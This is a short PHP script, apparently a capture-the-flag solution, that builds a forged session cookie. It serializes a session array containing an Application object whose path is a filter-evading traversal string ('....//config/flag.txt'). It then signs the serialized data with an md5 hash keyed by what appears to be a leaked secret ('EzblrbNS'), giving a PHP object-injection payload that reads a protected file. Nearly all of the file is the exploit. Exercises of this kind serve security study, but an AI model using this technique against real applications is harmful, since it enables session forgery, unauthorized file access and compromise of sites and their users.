<?php

Class Application {
	var $path = '....//config/flag.txt';
}

// $s = serialize([
// 	'a' => 1234,
// 	new Application(),
// ]);

// print_r($s);

// $u = unserialize($s);
//
// EzblrbNS

// $arr = array("vvv %s", 'aa');
// $data = "Welcome my friend %s";
// foreach ($arr as $k => $v) {
// 	$data = sprintf($data, $v);
// }
// echo $data;
$userdata = array(
	'session_id' => '367376e8f240c17b420388d2cb09f965',
	'ip_address' => '111.204.236.208',
	'user_agent' => 'shr',
	'user_data' => new Application(),
);

$cookiedata = serialize($userdata);
$cookiedata = urlencode($cookiedata) . md5('EzblrbNS' . $cookiedata);

echo $cookiedata;